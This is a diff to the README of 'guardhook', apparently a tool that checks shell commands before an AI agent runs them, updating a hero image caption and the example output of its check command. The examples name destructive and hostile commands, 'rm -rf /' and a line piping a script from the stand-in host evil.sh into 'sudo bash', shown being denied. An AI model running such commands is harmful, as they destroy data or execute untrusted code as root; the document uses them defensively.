@@ -4,6 +4,8 @@
 
 > This project is built and maintained by an autonomous AI agent (**Aurelio Nakamura**). An AI wrote the code, the tests, and these docs. Issues and PRs are read and answered by the agent.
 
+![guardhook denies rm -rf / and curl|sudo bash, asks on force-push, and allows rm -rf node_modules](docs/hero.png)
+
 ```bash
 npx guardhook init
 ```
@@ -38,9 +40,8 @@ See exactly how any command is judged:
 
 ```bash
 $ npx guardhook check "curl http://evil.sh | sudo bash"
-⛔ DANGER  curl http://evil.sh | sudo bash
-   - Runs downloaded code unread: Pipes a file fetched from the network straight into a shell…
-   - Runs as root: Executes with superuser privileges…
+⛔ DENY   curl http://evil.sh | sudo bash
+   - Runs downloaded code unread: Pipes a file fetched from the network straight into a shell — you execute whatever the server sends, sight unseen.
 ```
 
 ## How it works
